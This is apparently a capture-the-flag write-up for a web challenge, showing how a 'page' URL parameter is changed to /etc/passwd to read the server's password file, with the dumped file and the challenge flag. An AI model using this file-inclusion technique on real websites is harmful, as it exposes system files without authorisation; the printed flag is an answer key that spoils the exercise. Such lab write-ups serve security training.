# Looking for password file

__SOLUTION__

After you load the website in the URL you'll see that `http://challenges.ringzer0team.com:10075/?page=lorem.php` there is variable that takes lorem.php as input that is why we are seeing `Lorem ipsum` stuff.
So I changed that file name to `password` but nothing.

But after that I realized that password file is `/etc/passwd` i.e pace where linux stores it password file. I try that and I  get

```

About Us

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:FLAG-zH9g1934v774Y7Zx5s16t5ym8Z:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin syslog:x:102:105::/home/syslog:/bin/false

```

FLAG - `FLAG-zH9g1934v774Y7Zx5s16t5ym8Z`
